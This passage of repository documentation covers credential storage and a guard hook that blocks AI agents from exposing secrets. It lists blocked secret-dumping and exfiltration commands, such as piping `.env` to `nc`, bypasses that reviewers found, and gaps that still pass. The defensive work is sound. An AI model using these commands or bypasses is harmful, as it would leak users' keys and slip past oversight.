  the token into your git credential helpers. `hf` 1.32.0 never saves a
  pasted token to git and does not ask. Older `huggingface-cli login`
  releases ask `Add token as git credential?`; answer `n`.
- Sign in on each host with that host's own token. A token is never copied
  between hosts.

**What agents may run.** `hf` reads the token file itself:

```sh
hf auth whoami
hf download <repo> --revision <40-hex commit> --local-dir <models dir>/<name>
hf cache verify <repo> --revision <40-hex commit> --local-dir <models dir>/<name>
hf cache ls
```

Agents never run `hf auth token`, which prints the token to stdout. The guard
blocks it, `huggingface-cli ... token`, any command that names either token
file directly (also as `$HF_HOME/token`), a reader, copy or input redirect on
`$HF_TOKEN_PATH`, and a reader or copy of the whole Hugging Face home. The
deny rules keep the Read tool off both default paths. `hf auth list` shows the first three and last four
characters of each saved token. The guard does not block it, but an agent has
no need for it.

**Services and workers.**

- A model-serving unit serves from a pinned local directory (the
  `--local-dir` of a revision-pinned download above), never from a Hub id.
  New units set `Environment=HF_HUB_OFFLINE=1`, so a server built on
  `huggingface_hub`, such as vLLM, makes no Hub request at all. llama.cpp
  does not read that variable (build b11146, checked on 2026-09-25, has an
  `--offline` flag instead); give it a local `--model` file, and `--offline`
  where the build has it. No unit carries a token, and no `EnvironmentFile=`
  holds one.
- A worker that needs no gated or private repository sets
  `HF_HUB_DISABLE_IMPLICIT_TOKEN=1`, and one that downloads nothing also sets
  `HF_HUB_OFFLINE=1`. With the variable set, `huggingface_hub` 1.32.0 sends
  the token only when code passes it explicitly (`token=True` or a token
  string); implicit use — the default when calling code passes no `token`
  argument — is off for every call, writes included
  (`utils/_headers.py` `get_token_to_send`). This prevents accidental use of
  the token. It does not stop a deliberate read, because the worker runs as
  your user and can still read the file.
- A gated download happens in a signed-in run (your shell, or an agent
  running `hf download` as above). Serving then runs offline from the
  result.

**Rotate** by deleting or refreshing the token at
<https://huggingface.co/settings/tokens>, then run `hf auth logout` and
`hf auth login` again. Rotate at once if the value was printed anywhere, for
example by `hf auth token`, and follow
[Rotation and incidents](#rotation-and-incidents).

<a id="memory-only-option-linux-kernel-keyring-2026-09-26"></a>

## Kernel keyring: transport and per-boot spare (2026-09-29)

Until 2026-09-29 this section was "Memory-only option: Linux kernel keyring
(2026-09-26)": on 2026-09-26 the operator supplied a Tavily API key and
decided that it should be used without being stored in a file, so it lived
only here. Since 2026-09-29 no key of record lives only in the kernel keyring
([decision](decisions/2026-09-29-key-management.md)): a kernel restart erases
the keyring, and the user's instruction that day was that no key may be lost.
Every key's store of record is its `0600` file in the store, and the Tavily
key's is `<store>/tavily.env`.
[`scripts/kernel_keyring.py`](../scripts/kernel_keyring.py) stays, as a
transport that hands a key to one command at a time and as a per-boot spare
that lasts until the next kernel restart. `tvly-keyring` and the `exec` lines
below keep working with the Tavily copy until then.

**Moving a keyring-only key into the file store.** First the key's inventory
row becomes a `private_env_file`. Then one command copies the keyring value
into that new file, so the value never passes through an agent, a prompt or
a command line:

```sh
python3 scripts/kernel_keyring.py exec tavily_api_key TAVILY_API_KEY -- python3 -I -S tools/credentials/set_credential.py tavily --from-env
```

`exec` puts the one variable into the writer's environment. Then
`set_credential.py --from-env`:

- refuses unless the interpreter was started with `-I -S`. It checks
  `sys.flags.isolated` and `sys.flags.no_site` before anything else and
  never re-executes itself in this mode, because code that ran at start-up
  ran beside the value. `-I` ignores `PYTHONPATH`, the `PYTHON*` variables
  and the user site directory; `-S` also skips `site`, which runs the `.pth`
  lines of the interpreter's own `site-packages` even under `-I`, and on a
  uv-managed Python that directory sits in the home directory;
- stores only an entry that declares exactly one variable. A pair such as the
  Alpaca keys is refused, because its provenance cannot be proven from an
  inherited environment;
- takes the variable out of its own environment first, then refuses an
  absent, empty or out-of-grammar value by the same rules as the hidden
  prompt;
- is create-only. It refuses an existing file before it writes anything,
  and the finished temporary file gets its final name through `os.link`,
  which fails instead of replacing a file that appeared in between. There is
  no replace option: rotate with
  `tools/credentials/open_credential_terminal.sh tavily`;
- writes that temporary file as a dot-file, `.tavily.env.<16 hex>.tmp`. A
  kill before the link leaves it behind: the checker lists it by name as
  `undeclared_store_file`, and neither the checker nor the writer ever takes
  it for the stored key. The operator deletes it by hand;
- prints only `tavily: stored`, and no message holds the value.

Run it once, before the kernel restarts, from a checkout whose inventory
already lists the file: the writer reads the inventory beside it.
`scripts/credential_status.py` then reports the row `ok` ([Checker](#checker)).
New keys never go through the keyring: the operator types each one once with
`tools/credentials/open_credential_terminal.sh <inventory-id>`.

**Interim step (2026-09-29, until the id-based runner lands).** `tvly-keyring`
and the `exec` lines below read the keyring copy, not the file. After
rotating the Tavily key with `tools/credentials/open_credential_terminal.sh tavily`,
also refresh that copy in your own terminal with
`python3 scripts/kernel_keyring.py store --replace tavily_api_key`, or accept
that they keep the old key, which fails once it is revoked at Tavily, until
the next kernel restart drops the copy.

**Store a key in the keyring** in your own terminal, never through an agent.
Run `store` without a pipe: it turns echo off, prompts, and reads one pasted
line, so the value never passes through your shell, its history or a command
line:

```sh
python3 scripts/kernel_keyring.py store tavily_api_key     # paste at the hidden prompt, then press Enter
python3 scripts/kernel_keyring.py status tavily_api_key    # tavily_api_key: present
```

`store` also reads a value piped in from another program. Do not stage the
value in a shell variable while shell tracing is on: with `set -x`, bash
printed the expanded `printf %s "$K"`, value included, on stderr (measured
with a canary on 2026-09-26). Where the hidden prompt cannot turn echo off,
use a subshell that turns tracing off first; `K` ends with the subshell:

```sh
( set +x; read -rs K && printf %s "$K" | python3 scripts/kernel_keyring.py store tavily_api_key )
```

`read -rs` reads without echo, and `printf` is a shell builtin in bash and
zsh, so the value never appears in any process's arguments. `store` refuses
a name that is already stored; `--replace` revokes the old key and then
stores the new one, which is also how to rotate. It checks for an existing
key before the prompt and again after the value was read, under a lock that
`revoke` also takes, so two stores of one name that run at once cannot both
succeed without `--replace`. The lock is a Linux abstract socket name for
your uid, not a file. Names use lowercase letters, digits, `.`, `_` and `-`.

**Use it** through `exec`, which reads the key and starts the command with
one variable set, in that command's environment only. A stored key can also
be used through the key runner ([Using a key](#using-a-key-available-2026-09-29)),
which reads the file and masks the output; it is available, and becomes the
default path once the command guard models it. Until then `exec` stays the
documented path for the per-boot spare, which ends at the next kernel
restart:

```sh
python3 scripts/kernel_keyring.py exec tavily_api_key TAVILY_API_KEY -- tvly search "<query>" --json
python3 scripts/kernel_keyring.py revoke tavily_api_key    # remove it
```

Agents and workflow steps run the same line from the checkout root, so
nothing goes into a shell startup file, a unit file or a prompt. `exec` sets
only a credential variable: a name of the form `[A-Z_][A-Z0-9_]*` that ends
in `KEY`, `KEY_ID`, `TOKEN`, `SECRET`, `PASSWORD` or `PASSPHRASE`, such as
`TAVILY_API_KEY`, and does not start with `LD_`, `DYLD_` or `PYTHON`. A
program that reads a variable at startup can print its value in an error
message, even when the command itself prints nothing. Measured with a canary
on 2026-09-26: Python printed the values of `PYTHONWARNINGS`, `PYTHONHOME`
and `PYTHONIOENCODING`, bash printed `LC_ALL`, `tput` printed `TERM`, git
printed `GIT_TRACE`, and `PYTHONPYCACHEPREFIX` made Python create a directory
named after the value. The script never prints the value; its errors name
the key or an errno only. The command that `exec` starts can print it, so
give `exec` only commands that use the key without printing it.
[`adoption/tools/tvly-keyring`](../adoption/tools/tvly-keyring) is the same
`exec` for `tvly` alone, as an installed command:
`tvly-keyring search "<query>" --json`
([adoption/tools/README.md](../adoption/tools/README.md#tvly-keyring-2026-09-26)).
`scripts/credential_status.py` inspects files and never queries the keyring.
A `kernel_keyring` row, of which none remains since 2026-09-29, is listed as
`unchecked` with persistence `memory_only` and the warning
`memory_only_lost_on_restart`, and a required one is an inventory error.
Keys named `native-agent-stack:<name>` that no row declares, such as the
Alpaca spares and, until the restart, `tavily_api_key`, are listed by their
full name under `undeclared_keyring_key`. `status` is still the presence check for one
key. The Tavily commands are in [`recipes/tavily.md`](../recipes/tavily.md).

**Lifetime.** The key stays until it is revoked or the kernel stops. The
kernel keeps a user keyring for as long as its user namespace exists, whether
or not a process of that uid is running (upstream
`security/keys/process_keys.c`, `get_user_register()`; the user-keyring(7)
page in man-pages 6.19 still describes the older rule that tied it to running
processes), so a distribution stopping on its own does not erase it while
the VM runs. On WSL2 the kernel stops with `wsl --shutdown`, with a Windows
restart or update, and when WSL shuts the VM down after it has been idle for
`vmIdleTimeout` (default 60 seconds, Windows 11 only); a distribution itself
stops after it has been idle for `instanceIdleTimeout` (default 15 seconds)
([WSL configuration](https://learn.microsoft.com/en-us/windows/wsl/wsl-config),
updated 2026-09-16). After that, `status` prints `absent`, `exec` refuses to
start the command, and a spare must be stored again. The store file is not
affected.

**Scope.** The key is a `user` key named `native-agent-stack:<name>` in the
user keyring of one uid on one kernel, with permissions `0x3F0B0000`: all for
a process that possesses it; view, read and search for any process of the
same uid; nothing for anyone else. It is not shared with other hosts, and
each host stores its own. WSL2 runs every distribution on the same kernel.
This distribution runs in the kernel's initial user namespace (measured:
`readlink /proc/self/ns/user` gives `user:[4026531837]`), so another
distribution that also does would see the same user keyring for the same uid.
That was not measured across distributions.

**macOS** has no kernel keyring. The store file is the key of record there
too, typed once with `tools/credentials/open_credential_terminal.sh tavily`.
To run a command with the key there, the operator may use the login Keychain
through their own `secret` helper, as the Alpaca paper lane does
([`adaptive-paper/README.md`](../blueprints/us-equities/adaptive-paper/README.md)
and the 2026-09-25 addendum to
[`decisions/2026-09-22-broker-credential-handling.md`](decisions/2026-09-22-broker-credential-handling.md)):
`secret set TAVILY_API_KEY` once, then
`secret run TAVILY_API_KEY -- tvly search "<query>" --json`, which exports
the value only in that command's process. The helper is the operator's own
tool, not part of this repository, and this use for Tavily has not been run
on a Mac.

**What it does not protect against.**

- Any process of the same uid can read the key: `exec` with any command, a
  few lines of Python, or `keyctl print` where keyutils is installed. That
  includes every agent session running as you. The deny rules do not cover
  the keyring. When the key was first stored, the guard hook did not either:
  on 2026-09-26 its `check()` passed `keyctl print`, `keyctl pipe` and
  `keyctl read`, and every command given to `exec`, because it did not look
  past `exec ... --` and `TAVILY_API_KEY` was not one of its secret names.
  `exec tavily_api_key TAVILY_API_KEY -- env`, `-- printenv TAVILY_API_KEY`
  and `-- sh -c 'echo $TAVILY_API_KEY'` all passed, while a bare `env` or
  `printenv TAVILY_API_KEY` was blocked. A later change that day covers these
  forms ([Guard coverage](#guard-coverage-2026-09-26) below). The guard is
  still a text heuristic, so give `exec` only the commands in
  [`recipes/tavily.md`](../recipes/tavily.md).
  It is the residual risk the file store already has (see
  [the threat model](#threat-model-and-what-each-guard-stops)),
  without the file: nothing to commit, back up, sync or read through
  `\\wsl.localhost` from Windows. A Windows process can still start a command
  in the distribution as you with `wsl.exe`. Root can read the key too.
- While the command started by `exec` runs, its environment holds the value,
  readable by the same uid and root through `/proc/<pid>/environ`, as with
  the subshell pattern in [Picking up in a new session](#picking-up-in-a-new-session).
- Memory only does not mean no disk ever holds the value: the guest can swap
  a running command's memory, its environment included, to the WSL swap file
  (`swap`, default 25% of memory).
- A value that was pasted into a chat, a prompt or a tool call is already in
  the stores that keep output: Claude Code transcripts, ai-memory
  observations and the others under
  [Telemetry and pasted values](#telemetry-and-pasted-values). The keyring
  does not remove those copies. The Tavily key stored on 2026-09-26 arrived
  that way, and the operator accepted it for this practice use. If that exposure
  matters, rotate the key at Tavily, store the new value with
  `tools/credentials/open_credential_terminal.sh tavily` (type `replace` at
  the hidden prompt), and purge the copies as in
  [Rotation and incidents](#rotation-and-incidents).

**Checked on this host (2026-09-26, WSL2 kernel 6.18.33.2, x86_64).** These
are local integration checks, not an upstream test.
[`tests/test_kernel_keyring.py`](../tests/test_kernel_keyring.py) stores
generated throwaway values under names unique to each run and covers: the
store, status, exec and revoke round trip; that the child gets the value in
its environment and not on its command line; that no subcommand prints a test
value; `--replace`; two stores of one name at once, the first held at its
hidden prompt while the second completes (the first is then refused, or with
`--replace` revokes the second's key); `store` and `revoke` waiting while the
lock is held; refused names and variables, including the startup variables
above, with a positive control in which Python prints a `PYTHONWARNINGS`
value; hidden terminal input; and a session keyring that does not link the
user keyring (as with systemd `KeyringMode=private`). Such a session does not
possess keys in the user
keyring. `store` still sets the permissions there, because it creates the key
in its own process keyring and links it into the user keyring only
afterwards; `revoke` invalidates the key, because only a process that
possesses a key may revoke it. The first prototype of the script ignored the
permission call's result: in such a session its key kept the kernel default
(same uid: view only), and a later `exec` failed with `EACCES`. Run against
the script's first committed version, the race, lock and startup-variable
tests fail. The committed script finds the key stored on 2026-09-26:
`exec tavily_api_key TAVILY_API_KEY -- tvly auth --json` returned
`"authenticated": true, "method": "env"`, and `tvly auth --json` without
`exec` returned `"authenticated": false`, so this host holds no Tavily
credential file. Not run: another distribution, macOS, aarch64. CI runs the
tests where the keyring system calls are allowed and skips them otherwise.

### Guard coverage (2026-09-26)

A later change on 2026-09-26 extended
[`scripts/hooks/secret_path_guard.py`](../scripts/hooks/secret_path_guard.py)
to the keyring. It blocks, by reason code:

- `keyring_payload_read`: `keyctl print`, `pipe` and `read`, which output a
  payload, and `dh_compute`, which prints base ^ private (mod prime)
  computed from three keys' payloads; with a private key of 1 that is the
  base key's own payload (keyctl(1), keyutils Git as published on man7.org on
  2026-08-04). `keyctl list` and `rlist` read their target and print it as
  key IDs without checking that it is a keyring ("No attempt is made to
  check that the specified keyring is a keyring", keyctl(1)); on a `user` key
  they print its payload as integers (`act_keyctl_list` and
  `act_keyctl_rlist` in keyutils Git master, commit c076dff2, read
  2026-09-26). Both are blocked whatever the target: a first version allowed
  them on keyring targets, and a re-check found that a key serial written
  before a redirection (`keyctl rlist 123456789 </dev/null`) was read as the
  redirection's descriptor and passed. `kernel_keyring.py status` answers
  whether the key is present. `keyctl show` reads only keyrings and
  passes, as do `request`, `request2` and `prequest2`, which print only a
  key ID. keyctl accepts only the whole command name: its lookup skips every
  name longer than the word typed, although keyctl(1) says a shortening
  works. The same reason covers a payload read in inline interpreter
  code: `KEYCTL_READ`, `keyctl_read(`, `keyutils.read_key`, an import of
  `kernel_keyring`, a raw keyctl system call (250 on x86_64, 219 on
  aarch64) with operation 11, or `keyctl print` (or `list`/`rlist` on
  anything but those keyrings) run as a subprocess. That
  check runs only when the command starts an interpreter, so a code search
  or a commit message that names `KEYCTL_READ` passes.
- Every existing rule, applied to the command that `kernel_keyring.py exec`
  (any path to the script, any launcher such as `python3 -I` or
  `uv run python`) or `tvly-keyring` starts. `-- cat .env` is a
  `dotenv_read`, `-- strace ...` a `process_trace`, and so on. A launcher's
  own options are read as getopt reads them, from each tool's `--help`
  (`stdbuf -o0`, `nice -n 5`, `timeout -s KILL 5`, `xargs -I {}`,
  `sudo -iu root`), and an output redirection before a command
  (`> out tvly auth`) does not hide it.
- `keyring_variable_reference`: any mention of the injected variable except
  the `<ENV_VAR>` argument of `exec` itself, whether in the started command,
  in code piped into it or in a here-document. The guard exempts that
  argument's own place in the command after quote removal, so an argument
  split by quotes, a backslash or a line continuation (`KK_DEMO_TO"KEN"`)
  cannot use up the exemption that a reference then hides behind. A variable outside the guard's secret
  names counts too. `TAVILY_API_KEY` is now one of those names, so
  `$TAVILY_API_KEY` anywhere is a `secret_variable_reference`.
- `environment_dump_in_keyring_exec`: the started command dumps the
  environment it inherits: `env`, `printenv`, `set`, `export -p`,
  `declare -p`, `ps e` or `ps -E` (also inside `sh -c`); the same, or a shell, an
  interpreter, awk or jq, as another program's argument, which the guard
  reads as a command from there on, since that is how a launcher it does not
  model (`find -exec`, `watch`, `flock`, `taskset`, GNU `time -f`) runs it;
  a shell's `${!...}`
  indirection; or code that reads the whole environment (`os.environ`,
  `environb`, `getenv`, `process.env`, `Deno.env`, `%ENV`, a bare `ENV`,
  `$_ENV`, PowerShell's `env:`, awk's `ENVIRON`, jq's `env`, or a quoted
  `env`, `printenv`, `set` or `export` handed to a subprocess). The code
  check runs only when the started command runs an interpreter, awk or jq,
  so a `tvly search` whose query mentions `os.environ` passes. The price of
  the argument rule: a one-word query `env` or `printenv` is blocked, and so
  is `set`, `export`, `declare` or `typeset` as the command's last word
  (`tvly search set --json` passes).
  `/proc/*/environ` stays a `process_environment` everywhere.
- `native_token_print`: `tvly auth` without `--json`, which prints the key's
  first eight and last four characters (tavily-cli 0.1.8
  `commands/auth.py`). A redirection's target or a here-document delimiter
  is not the flag: `tvly auth > --json` prints them into a file named
  `--json`. `native_store_path`: `~/.tavily/config.json`, where
  `tvly login` and `tvly init` store a key or an OAuth token.

Every text rule of the guard also reads the command after the shell's quote
removal, with each backslash-newline joined first, so
`sh -c 'echo $GH_TO''KEN'`, whose inner shell runs `echo $GH_TOKEN`, is a
`secret_variable_reference`. A cross-family review the same day found the
split exec argument, `stdbuf -o0` before an interpreter, `keyctl rlist` on
a user key and `tvly auth > --json` passing the first version of these
rules. Each was reproduced against that version before the fix and is now a
regression case in `tests/test_secret_path_guard.py`. A GPT-6 re-check of the
repair found four more, each reproduced and fixed the same day:
`"$KK_DEMO_TOKEN"x`, which quote removal had merged into another name (both the
written and the unquoted text are now read); a key serial before a redirection
(list and rlist are now blocked outright); bash's named descriptor
(`tvly auth {fd}>--json`, now parsed as a redirection); and a false block of a
search query `export` followed by `--max-results` (declare/export flags are now
short options only).

The documented `store`, `status`, `revoke` and `exec ... -- tvly ...` forms
pass, and `tests/test_secret_path_guard.py` checks every keyring command in
the fenced blocks of this page, `recipes/tavily.md` and
`adoption/tools/README.md`. These still pass, recorded in that test's
`EXPECTED_PASS_THROUGH`: a shell or interpreter that `exec` starts and that
reads its commands from a pipe or a script file; a copy of
`kernel_keyring.py` under another name; a keyctl system call whose
number is held in a variable; a variable name that the started command
assembles at run time; a launcher that takes its command as one string
(`script -c`); and, outside a keyring exec, a reader behind a launcher the
guard does not model (`watch -n 5 cat .env`). The macOS
`secret run NAME -- command` form is not unwrapped. A host runs the new rules only after its user-level copy
is replaced (`tools/adoption/install_claude_profile.py --only guard`, see
[User-level guards](#user-level-guards-deployed-by-the-claude-profile)).

### Launchers, substitutions and manager environments (2026-09-29)

A coverage review of the guard's own rules on 2026-09-29 found command forms it read too little of, each a way a stored
value could be shown or forwarded by mistake, and repair rounds the same day fixed what read-only reviews of that work
found. Each form gets the verdict of its plain equivalent where stated below. One rule was loosened, on purpose and only
for the value of a clustered value-taking `ps` option (see "Loosenings" below); every other change tightens, so a
command that the base guard (main at c26800f3) blocked is blocked now unless it is one of those, and
`tests/test_secret_path_guard.py` keeps every earlier row except two that recorded the `systemd-run` gap and moved from
`EXPECTED_PASS_THROUGH` to `BLOCKED`. The guard is a text reader of one line of shell, not a shell: what it does not
read is listed at the end of this subsection.

- **systemd's launchers are modelled: `systemd-run`, `run0`, `systemd-inhibit`, `systemd-cat`.** Each one's own options
  are skipped as getopt reads them, redirections between them included (`systemd-run --user 2>/tmp/log --pipe printenv`),
  and the command it starts gets every rule, a nested `bash -ic '...'` string too. The option tables come from upstream:
  `src/run/run.c` at systemd v255 for `systemd-run` (getopt string `+hrH:M:E:p:tPqGdSu:`), with the value options of later
  releases listed so a newer host's command is still found (`--capsule`/`-C` and `--background` from v256, `--json` from
  v257, `--job-mode` from v258, `--root-directory` from v259 and `--output` from v261, each read in `run.c` at that tag);
  `parse_argv_sudo_mode` in `run.c` at v256 to v262 for `run0`; `src/login/inhibit.c` and `src/journal/cat.c` for
  `systemd-inhibit` and `systemd-cat`. What a launcher prints goes to the caller with `systemd-run --pipe` (`--wait`
  shows terse unit information, and without either the output goes to the journal, `systemd-run(1)` 255), and
  `systemd-cat` writes it to the journal, so `systemd-run --user --pipe --wait cat "$PAPER_ENV_FILE"` is a
  `credential_file_read`, `... printenv` and `systemd-cat printenv` an `environment_dump`. The trading lane's loader path
  (`systemd-run --user --unit=X --collect /bin/bash -ic 'exec python3 runner.py run --env-file "$PAPER_ENV_FILE_2"'`)
  still passes for both accounts. A secret variable name (any name in the guard's list), with or without a value, set
  through `systemd-run`'s `-E`/`--setenv` or `-p Environment=...` is a `secret_variable_on_command_line`. Where such a
  value goes (systemd v255, `src/run/run.c`, read 2026-09-29): into the command line of the `systemd-run` process itself,
  which the process listing (`/proc/PID/cmdline`) shows while it runs, and into the transient unit's `Environment`
  property, appended to the start message over the user bus (`arg_environment`), which `systemctl --user show -p
  Environment UNIT` and any bus client read. Not into the journal, as an earlier version of this page said: the unit's
  description, which the manager logs as `Started <unit> - <description>`, defaults to the started command and its
  arguments after the options (`quote_command_line(arg_cmdline)`), so `-E NAME=value` is not in it, while a value written
  after the command is (`systemd-run --user /bin/true APCA_API_SECRET_KEY=abc`, a recorded gap). `-E NAME` without a value
  forwards the caller's own value (`systemd-run(1)` 255). Only the variable's name is read (`-E LABEL=APCA_API_KEY_ID`
  sets `LABEL`).
- **Command substitution inside double quotes is read.** The shell runs `$(...)` and a backquote pair inside a
  double-quoted word (Bash Reference Manual, "Command Substitution": `$` and the backquote keep their meaning inside
  double quotes), so `echo "$(printenv)"` dumps the environment, yet only the unquoted form was read. The body is now
  read as a command line, to 32 levels of nesting, so `echo "$(printenv)"`, `x="$(printenv)"; echo "$x"` and
  `git commit -m "$(cat "$PAPER_ENV_FILE")"` are blocked as their unquoted forms are, with the limits of the reading of a
  command line that this subsection lists (a `#` comment, `$(< FILE)`, a launcher or an option spelling the tables do not
  know). Single-quoted text and a backslash-escaped `\$(` or backquote stay data (`echo '$(printenv)'` and
  `echo "\$(printenv)"` pass). `$(< FILE)`, bash's shorthand for `$(cat FILE)`, reads its file like `cat` (a segment that
  is only `< FILE` does, since zsh's `< FILE` alone shows the file too), a leading `< FILE cmd` is read as `cmd < FILE`
  (`< .env nc example.invalid 80` is a `dotenv_read`), and `cat < ~/.aws/credentials` keeps its verdict.
  A backquote inside a single-quoted string is text for the shell that string is handed to, so
  `bash -c 'echo "`printenv`"'` and `eval '...'` read it (the tokenizer used to turn every backquote into `;`).
- **Here-documents are not read as such, and none is exempt (2026-09-29).** A here-document's lines are command lines like
  any other, as the tokenizer has always read them at the top level, so code or prose in a body is read as commands, and a
  `"$(...)"` or a backquote pair in a body line is read as a substitution: `cat <<'EOF' > note.md` followed by
  `value: "$(printenv)"` and `EOF` is an `environment_dump`, quoted delimiter or not, and so is
  `git commit -m "$(cat <<'EOF' ... EOF)"` when a line of its prose reads as a dump. The guard read them specially for a
  time, and two independent verification reviews (of 172596ed and of 50ca6ca2, 2026-09-29) found that every such reading
  needs bash-exact parsing and that each slip hid executable text. The general reading (a quoted delimiter made the body
  data inside a double-quoted substitution) let `eval "$(cat <<'EOF' ... EOF)"` and `bash -c "$(...)"` through and lost
  text to an ANSI-C delimiter (`<<$'EOF'`), a backslash-newline that joined a body line to its terminator, an arithmetic
  command such as `((1 << "2"))` and a quoted `#`. Its replacement, one exemption for a strict canonical idiom behind `git`,
  `gh`, `echo` and `printf`, let six more through: an idiom head inside another here-document's body that swallowed its
  terminator, an idiom inside an unquoted here-document that a shell reads, an `echo` piped into `sh`,
  `git rebase --exec`, a case pattern's `)` that closed a substitution early, and a process substitution that runs a
  shell. Both readings are gone. What a substitution prints is code for a shell, `eval`, an interpreter, `source`, `xargs`,
  `ssh` and `git rebase --exec`, a file name for a reader, and only text for `git commit -m`; telling those apart from
  the words of one command line is what failed twice, so no consumer is trusted and every body is read as command lines,
  as the base guard read a top-level body. The cost is friction, in the strict direction. A commit message or
  pull-request body written through `"$(cat <<'EOF' ... EOF)"` is refused when a line of its prose starts with
  `printenv` or `env` or holds `printenv` in backquotes (behind `git`, `gh`, `echo` and `printf` too), a literal
  `$(printenv)` example inside a quoted here-document is refused in file-writing (`cat > note.md <<'EOF'`), Python
  (`python3 <<'PY'`), commit-message (`git commit -F - <<'EOF'`) and pull-request-comment
  (`gh pr comment --body-file - <<'EOF'`) workflows, and Python's `set()` after a comment line in an interpreter's
  here-document (`# unique values` and then `print(len(set([1, 1])))`) is refused as the shell's `set`: the base guard's
  `#` hole hid it, and reading an interpreter's here-document as that interpreter's code is a later change. Write such
  text with the Write tool and pass the path: `git commit -F FILE`, `gh pr create --body-file FILE`, a script file for the
  interpreter. Measured 2026-09-29: of the 2,015 distinct commit messages on all refs of this repository (`git log
  --all`, a count that grows), in the `git commit -m` and `gh pr create --body` patterns, this guard refuses 36 and the
  base guard 16, and none that the base guard refuses passes; the five real messages that `tests/test_secret_path_guard.py`
  records (`REAL_COMMIT_MESSAGES`) are among them. Residual gaps, each an inert string in `EXPECTED_PASS_THROUGH`: an
  unquoted here-document that expands `$(...)` between single quotes (`cat <<EOF` with `'$(printenv)'` in its body),
  which the base guard passed too.
- **A `#` comment hides only its own line, and only where a word starts.** The tokenizer joins the lines of a command
  with `;` and shlex reads a `#` anywhere, `$#` and `a#b` included, as the start of a comment, so a `#` dropped the whole
  rest of the command: `# macOS` followed by `ps -E`, `echo ${#PATH}; printenv` and
  `gh api repos/o/r/issues/1#c; cat "$PAPER_ENV_FILE"` all passed, as did every command after a `## Summary` heading. A
  comment is now removed only from a `#` that starts a word, outside quotes and double-quoted substitutions, to the end
  of its line (Bash Reference Manual, "Comments"), and the guard keeps its earlier reading of the same command besides,
  so nothing it read before is dropped (up to 200,000 characters: tokenizing costs about 9 microseconds a character inside
  quotes, and two readings of an 840 KB message took 17.8 s against a 10 s hook timeout, one reading 8.9 s). Inside a
  `$(...)` body a comment also runs to the end of its line (`echo "$(date # )` newline `printenv` newline `)"` runs
  printenv). In a here-document body a comment likewise hides only its own line: the lines of a script written through a
  here-document are read as commands, which the `#!` line of the script hid for a time. What this newly blocks, measured on
  this repository (2026-09-29): 4 of its 201 shell scripts when written through a here-document (their array literals
  `X=(env HOME=...)`, which the guard reads as an `env` with no command), one of 785 fenced blocks (a python
  `len(set(found))`) and none of 4,338 fenced lines; the same array literals and python `set(...)` were always read as
  commands when a whole script is passed as one command string.
- **ANSI-C strings are data.** `$'...'` runs to the first `'` that a backslash does not escape, so
  `printf '%s' $'it\'s "$("printenv")"'` holds no substitution and passes; inside double quotes `$'` is no such string.
  shlex knows no ANSI-C quoting (it read `$'it\'s #\nprintenv\n'` as a word, a quote that opens and a comment, and the
  harmless text was refused), so the tokenizer keeps each such string as one word of the same text, its `\'` written as a
  quote shlex reads: `printf '%s' $'it\'s #\nprintenv\n'` passes and `bash -c $'printenv'` is read as `bash -c printenv`.
  Escapes such as `\n` and `\x..` are not decoded.
- **Arithmetic expansion is no command.** `$((` opens an arithmetic expansion only when a `))` that touches closes it:
  `env=2; echo "$((env))"` reads the variable `env` and a `<<` in it is a shift, so both pass, while a real substitution
  inside it (`$(( $(printenv | wc -l) + 1 ))`) is still read and `$((printenv) )`, whose parentheses do not touch, is a
  substitution holding a subshell, as bash reads it.
- **`ps -E` is an environment display.** macOS `ps` documents `-E` as "Display the environment as well" and lists the
  BSD-style `e` as "Same as -E" (Apple `adv_cmds` `ps.1`, read 2026-09-29). The guard blocked dashless clusters with a
  lower-case `e` (`ps eww`, `ps auxe`) but not these. It now blocks, as an `environment_dump`, `-E` alone or in a cluster
  before the first option that takes a value (`ps -Ewwp 123`, `ps -p 123 -E`, `ps -A -E`) and dashless clusters with a
  capital `E` (`ps Eww`, `ps auxE`). `ps -ef`, `ps -o pid,command -p N`, `ps aux` and an `E` that is only a value pass:
  the word after a stand-alone value option (`ps -u Eve`), after a cluster that ends in one (`ps -fu Eve`) or glued to
  it (`ps -uEve`); a dashed `-e` is every process. `ps -fu steve` and `ps -fu eve` pass too, a deliberate loosening
  against the base guard (see the list below): `-u` takes a value, and the base guard read the user name as a BSD flag
  cluster with an `e` and refused them. `-C` is a flag on macOS and takes a command name on procps, so a dashed
  word with an `E` right after it (`ps -C -E`, `ps -CE`) is refused whichever host runs it, and `ps -CEmacs` with it, which
  is friction: on procps `-C` takes a command name, so write `ps -C emacs`. The dashless cluster test is a set-membership
  test (see the timeout item).
- **`systemctl show-environment` and a bare `systemctl show` are environment dumps.** `show-environment` prints a
  service manager's whole environment block, "the environment block that is passed to all processes the manager spawns"
  (`systemctl(1)` 255), and `show` with no unit prints the manager's own properties, `Environment=` among them, so
  every variable the session imported into that manager, a credential included, lands in the output. Both are blocked as
  a `service_manager_environment`, with or without `--user`, behind any options (the option table of
  `src/systemctl/systemctl.c` at v255 says which words are values: `-M host`, `-H user@host`, `-o json`), behind a
  launcher and inside a substitution; `show` passes when a unit is named or `-p` names other properties only. For one
  unit use `systemctl --user show -p Environment UNIT`; for the `PATH` a unit sees run a command in one:
  `systemd-run --user --pipe --wait --collect /bin/sh -c 'command -v node; echo "$PATH"'`. `systemctl --user cat`,
  `status` and `list-units` pass. Inside a keyring exec, behind a launcher the guard does not model (`watch`, `flock`),
  `systemctl` and the systemd launchers are read like the shells and `env` already are.
- **Launchers named by their path are the same launchers** (`/usr/bin/sudo systemctl show-environment`,
  `/usr/bin/timeout 5 printenv`): the wrapper walk compared the whole word.
- **A redirection between a launcher's hops is read wherever it stands (2026-09-29).** Bash removes a redirection from the
  argument list wherever it stands, so `env -u < "$PAPER_ENV_FILE" UNUSED cat` is `env -u UNUSED cat < "$PAPER_ENV_FILE"`.
  The launcher walk took the operator for the value of `-u`, `--unit`, `-n` and the like, dropped the segment that held the
  operand and let that string and `systemd-run --pipe --unit < "$PAPER_ENV_FILE" demo cat` through, both refused by the
  base guard (found by the independent verification review of 172596ed). Now each raw segment is read as written beside
  any walk; the walkers (`env`, `systemd-run` and its siblings, `sudo`, `nice`, `timeout`, `rtk`, a keyring exec) step
  over a redirection operator and its target wherever they look for an option, a value or the started command, so they
  never take one for a value; and an input redirection they stepped over is read with the command that gets it. For every
  launcher, every position between its hops and each of `<`, `<<<`, `2>`, `>`, `>>` and `&>`, the verdict is the one the
  same command gets with the redirection written last (684 combinations in the tests, none looser than the base guard; 166
  stricter, the operand of a `cat` that the base guard missed because it stood before the command, as in
  `env -u UNUSED < .env cat`). A number before an operator still ends the options of `sudo` and `nice`
